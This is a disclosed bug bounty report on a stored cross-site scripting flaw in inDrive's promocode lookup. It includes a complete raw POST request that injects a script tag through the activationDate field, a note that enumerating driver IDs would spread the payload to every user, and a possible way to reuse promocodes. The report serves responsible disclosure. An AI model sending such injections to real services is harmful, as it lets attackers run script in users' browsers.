# Stored XSS on promo.indrive.com

## Report Details
- **Report ID**: 2051085
- **URL**: https://hackerone.com/reports/2051085
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-07-05T12:45:19.388Z
- **Disclosed**: 2023-08-28T13:29:44.397Z

## Reporter
- **Username**: kristoferent
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: indrive

## Vulnerability Information
## Summary:
The functionality on https://promo.indrive.com/promocodes allows drivers to find and activate promocodes. It requires a driver ID. When user activates their promocode, the browser makes a POST request to https://id.indrive.com/api/spreadsheet/promocodes with parameters **id** (driver id) and **activationDate** (the date of the promocode activation). It is possible for an attacker to set parameter **activationDate** value to an XSS payload. When a user inputs the same ID when looking for promocodes, the XSS payload will trigger, executing arbitrary JavaScript code in the victims's browser.

## Steps To Reproduce:
1. Make a POST request to https://id.indrive.com/api/spreadsheet/promocodes with the following body: 
```
{"id":"4","activationDate":"<script>alert(1)</script>"}
```
{F2470829}
The driver ID value of **4** is used, but the attacker can enumerate through valid driver IDs to inject the payload into every user's promocode.
2. Go to https://promo.indrive.com/promocodes
3. Input a driver ID (in my example **4**) and click "Проверить ID". The XSS payload will be triggered
{F2470832}


## Supporting Material/References:
Full POST Request:
```
POST /api/spreadsheet/promocodes HTTP/1.1
Host: id.indrive.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 55
Origin: https://promo.indrive.com
Referer: https://promo.indrive.com/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
Connection: close

{"id":"4","activationDate":"<script>alert(1)</script>"}
```

## Impact

This vulnerability allows an attacker to execute arbitrary JavaScript code in any user's browser.
Despite this being a retired functionality, an attacker could trick users to try and get a promocode.
This could also potentially make promocodes usable infinite amount of times by directly making POST requests to renew the code every 24 hours.

## Attachments
- image.png
- image.png
